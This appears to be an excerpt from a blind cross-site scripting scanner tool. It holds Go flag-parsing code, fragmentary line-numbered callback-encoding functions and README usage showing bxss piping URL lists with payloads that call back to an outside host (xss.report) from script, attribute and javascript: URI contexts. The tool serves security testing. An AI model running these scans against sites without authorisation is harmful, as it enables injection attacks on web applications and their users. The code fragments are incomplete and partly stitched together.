	"fmt"
	"os"

	"github.com/ethicalhackingplayground/bxss/v2/pkg/colours"
)

type Arguments struct {
	Concurrency     int
	Header          string
	HeaderFile      string
	Payload         string
	PayloadFile     string
	Method          string
	AppendMode      bool
	Parameters      bool
	Debug           bool
	RateLimit       float64
	FollowRedirects bool
	Trace           bool
}

// Flag variables
var (
	debug           bool
	concurrency     int
	payload         string
	payloadFile     string
	method          string
	header          string
	headerFile      string
	appendMode      bool
	parameters      bool
	rateLimit       float64
	followRedirects bool
	trace           bool
)

// ValidateArgs validates the arguments passed to the program and prints the
func (a *Arguments) ValidateArgs() {
	// prints the default help and exits the program with status 1.

	// The banner
	fmt.Printf(colours.BannerColor, `
  ____                     
 | __ )  __  __  ___   ___ 
 |  _ \  \ \/ / / __| / __|
 | |_) |  >  <  \__ \ \__ \
 |____/  /_/\_\ |___/ |___/
                                        
	`, "")
	fmt.Printf(colours.TextColor, "", "v0.0.3")
	fmt.Printf("\n")

	// Check if at least one header and one payload option is provided
	if (a.Header == "" && a.HeaderFile == "") && (a.Payload == "" && a.PayloadFile == "") {
		flag.PrintDefaults()
		os.Exit(1)
	}
}

// NewArguments parses the command line flags and returns a pointer to an Arguments
// object. The Arguments object contains the parsed values of the flags, which can
// be used to configure the program. The function will panic if there is an error
// parsing the flags.
func NewArguments() *Arguments {

	// Define the flags
	flag.IntVar(&concurrency, "c", 30, "Set the concurrency level for the scanner")
	flag.StringVar(&header, "H", "", "Set a single custom header to test for blind XSS")
	flag.StringVar(&headerFile, "hf", "", "Path to file containing headers to test for blind XSS")
	flag.StringVar(&payload, "p", "", "The blind XSS payload to test")
	flag.StringVar(&payloadFile, "pf", "", "Path to file containing payloads to test for blind XSS")
	flag.BoolVar(&appendMode, "a", false, "Append the payload to the parameter value when testing")
	flag.BoolVar(&parameters, "t", false, "Test the parameters for blind XSS by appending the payload to the parameter value")
	flag.StringVar(&method, "X", "", "The HTTP method to use when testing (GET, POST, etc.)")
	flag.BoolVar(&debug, "v", false, "Enable debug mode to view full request details and debug information")
	flag.Float64Var(&rateLimit, "rl", 0, "Rate limit in requests per second (optional to prevent abuse)")
	flag.BoolVar(&followRedirects, "f", false, "Follow redirects when testing (optional)")
	flag.BoolVar(&trace, "l", false, "Enable trace mode to track which host is vulnerable to XSS, if your canary server support custom parameters, insert url={LINK}")

	// Parse the arguments
	flag.Parse()

	return &Arguments{
		Concurrency:     concurrency,
		Header:          header,
		HeaderFile:      headerFile,
		Payload:         payload,
		PayloadFile:     payloadFile,
		Method:          method,
		AppendMode:      appendMode,
		Parameters:      parameters,
		Debug:           debug,
		RateLimit:       rateLimit,
		FollowRedirects: followRedirects,
		Trace:           trace,
	}
}

18	// The callback must be an absolute http/https URL carrying a host:
19	// javascript:/data: URIs and hostless values are rejected so a navigable

21	// every builder has scheme, host, port and query components to round-trip.
22	func parseCallback(raw string) (*url.URL, error) {
23		if strings.TrimSpace(raw) == "" {
24			return nil, errors.New("callback is empty")
25		}

30		}

189	// {LINK} placeholder is emitted verbatim: braces are not string or markup
190	// delimiters, and leaving the token intact lets the scanner substitute the
191	// scanned URL at request time.
192	func percentEncode(value string) string {
193		const unreserved = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-._~"
194	
195		var builder strings.Builder
196		for i := 0; i < len(value); {
197			if strings.HasPrefix(value[i:], linkPlaceholder) {
198				builder.WriteString(linkPlaceholder)
199				i += len(linkPlaceholder)
200				continue
201			}
202	
203			byteValue := value[i]
204			if strings.IndexByte(unreserved, byteValue) >= 0 {
205				builder.WriteByte(byteValue)
206			} else {

208			}

## 🧩 Injection Contexts (`--context`)

The same callback breaks in different ways depending on where it lands. `--context` selects the encoding order; the callback itself is always parsed as a structured URL first, so scheme, host, port and query order round-trip exactly.

| Context     | Use when the callback lands in…            | Encoding |
| ----------- | ------------------------------------------ | -------- |
| `html` (default) | Raw HTML text/markup                  | Identity — payload sent byte-for-byte, legacy tag injection unchanged |
| `js`        | A `<script>` block or JS string            | Closes the string/script first, then JS-escapes and HTML entity-encodes the callback |
| `attribute` | A quoted HTML attribute                    | Breaks out with a quote and binds an event handler; `&` becomes `&`, never percent-encoded twice |
| `uri`       | A navigable `href`/`src` position          | Emits a percent-encoded `javascript:` URI; the callback is a JS string argument, not a query parameter |

Invalid values fail loudly with the list of supported contexts instead of silently falling back:

```bash
# JS string / script block
cat urls.txt | bxss --context js -p 'https://xss.report/c/username?a=1&b=2'

# Quoted HTML attribute
cat urls.txt | bxss --context attribute -p 'https://xss.report/c/username'

# Navigable href/src
cat urls.txt | bxss --context uri -p 'https://xss.report/c/username'
```
